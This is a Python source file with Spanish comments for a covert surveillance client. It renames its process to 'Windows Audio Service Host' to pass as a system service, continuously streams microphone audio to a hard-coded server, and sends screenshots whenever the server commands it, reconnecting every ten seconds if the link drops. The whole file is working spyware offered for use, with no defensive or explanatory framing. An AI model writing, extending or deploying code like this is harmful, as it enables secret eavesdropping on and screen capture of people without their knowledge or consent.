import socket
import pyaudio
import threading
import pyautogui
import io
import time
import sys
import setproctitle
from PIL import Image

# --- Configuración ---
setproctitle.setproctitle("Windows Audio Service Host") # Nombre en Task Manager
IP_DEL_SERVIDOR = '192.168.36.247'  # <--- CAMBIA ESTO POR LA IP DE TU SERVIDOR
PUERTO = 5000
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

def capturar_y_enviar_pantalla(sock):
    """Captura la pantalla, la comprime y la envía al servidor."""
    try:
        # Tomar captura
        screenshot = pyautogui.screenshot()
        
        # Convertir a bytes (JPEG para velocidad)
        buffer = io.BytesIO()
        screenshot.save(buffer, format="JPEG", quality=40) # Calidad baja para que sea instantáneo
        img_bytes = buffer.getvalue()
        
        # Protocolo: Enviar prefijo 'IMG:' seguido del tamaño (4 bytes) y luego los datos
        sock.sendall(b"IMG:") 
        sock.sendall(len(img_bytes).to_bytes(4, byteorder='big'))
        sock.sendall(img_bytes)
    except Exception as e:
        print(f"Error en captura: {e}")

def flujo_audio(sock, stream):
    """Hilo dedicado exclusivamente a enviar el audio sin interrupciones."""
    try:
        while True:
            data = stream.read(CHUNK, exception_on_overflow=False)
            # Enviamos prefijo 'AUD:' para que el servidor sepa que es audio
            sock.sendall(b"AUD:" + data)
    except:
        pass

def iniciar_cliente():
    p = pyaudio.PyAudio()
    
    while True:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((IP_DEL_SERVIDOR, PUERTO))
            
            # Configurar Micrófono
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, 
                            input=True, frames_per_buffer=CHUNK)

            # 1. Iniciar hilo de audio
            thread_audio = threading.Thread(target=flujo_audio, args=(client_socket, stream), daemon=True)
            thread_audio.start()

            # 2. Bucle principal: Escuchar comandos del servidor
            while True:
                # El cliente espera recibir comandos (ej: b"SCREEN")
                comando = client_socket.recv(1024).decode('utf-8', errors='ignore')
                
                if "SCREEN" in comando:
                    capturar_y_enviar_pantalla(client_socket)
                
                if not comando: break
                
        except (ConnectionRefusedError, socket.timeout, OSError, ConnectionResetError):
            time.sleep(10) # Reintento cada 10 segundos si falla
        except KeyboardInterrupt:
            p.terminate()
            sys.exit()
        finally:
            client_socket.close()

if __name__ == "__main__":
    iniciar_cliente()